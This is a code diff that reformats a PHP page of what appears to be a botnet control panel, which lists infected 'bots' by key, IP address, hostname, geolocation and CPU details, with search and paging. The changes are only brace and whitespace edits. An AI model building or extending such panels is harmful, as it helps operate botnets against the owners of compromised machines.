@@ -1,18 +1,15 @@
 <?php
-	if(isset($_GET['list']))
-	{
+	if(isset($_GET['list'])) {
 		$id2fetch = htmlspecialchars($_GET['list']);
 		if ($id2fetch < 1 || $id2fetch > 5000000) // I doubt we will get past 5 million bots
 			$id2fetch = 1;
-	}
-	else
+	} else
 		$id2fetch = 1;
 
 	$id2fetchend = $id2fetch * 50;
 	$id2fetchstart = $id2fetchend - 50 + 1;
 
-	if(isset($_POST['submit']))
-	{
+	if(isset($_POST['submit'])) {
 		$field = trim($_POST['field']);
 
 		$search = $conn->prepare("SELECT * FROM bots WHERE LOWER(CONCAT(bot_id, '', bot_key, '', bot_version, '', bot_ip, '', bot_hostname, '', bot_location_country, '', bot_location_region, '', bot_location_city, '', bot_cpu_cores, '', bot_cpu_mhz, '', bot_cpu_bogus, '', bot_cpu_arch, '', bot_cpu_arch2, bot_date_last, '', bot_date_join)) LIKE LOWER(CONCAT('%', :query, '%'))");
@@ -95,7 +92,6 @@
 
 	$numrows = 0;
 	while($row = $select->fetch(PDO::FETCH_ASSOC)) {
-
 		$BOTTABLE .= '<tr>';
 		$BOTTABLE .= '<td>' . $row['bot_id'] . '</td>';
 		$BOTTABLE .= '<td>' . $row['bot_key'] . '</td>';
@@ -138,22 +134,18 @@
 <!-- Page changers -->
 <?php
 	/* What the hell have I created */
-	if ($id2fetch != 1)
-	{
+	if ($id2fetch != 1)	{
 		echo "<a href=\"?p=bots&list=";
 		echo $id2fetch - 1;
 		echo "\">Page:";
 		echo $id2fetch - 1;
 		echo "</a>";
-	}
-	if ($numrows == 50)
-	{
+	} if ($numrows == 50) {
 		echo "<a href=\"?p=bots&list=";
 		echo $id2fetch + 1;
 		echo "\">Page: ";
 		echo $id2fetch + 1;
 		echo "</a>";
-	}
-	else
+	} else
 		echo $numrows
 ?>
